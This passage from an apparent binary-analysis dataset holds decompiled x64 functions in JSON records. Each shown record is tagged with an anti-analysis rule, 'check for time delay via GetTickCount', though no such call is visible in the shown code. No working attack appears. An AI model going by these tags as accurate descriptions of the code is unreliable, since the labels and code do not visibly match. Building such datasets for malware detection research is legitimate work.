0x140112570, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401088a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401088b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401125b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108430);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401126f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108440);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112730, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108450);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112770, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108460);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401127b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108470);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401127f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108480);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112810, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113240, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113280, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113320, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113340, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113360, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113380, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113400, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113450, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113490, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401135b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113640, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113660, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113680, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar3;\n    piVar2 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401136a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar2, iVar4, arg3);\n        return piVar2;\n    }\n    iVar4 = *(*piVar2 + -0x18) + piVar2;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar2;\n}\n",
        "token_count": 6914
    },
    "1400b95b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b95b0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108430);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401126f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108440);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112730, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108450);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112770, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108460);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401127b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108470);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401127f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108480);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112810, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113240, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113280, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113320, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113340, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113360, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113380, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113400, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113450, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113490, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401135b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113640, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113660, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113680, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 4454
    },
    "1400b961": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9610(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108440);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112730, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108450);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112770, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108460);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401127b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108470);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401127f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108480);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112810, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113240, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113280, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = 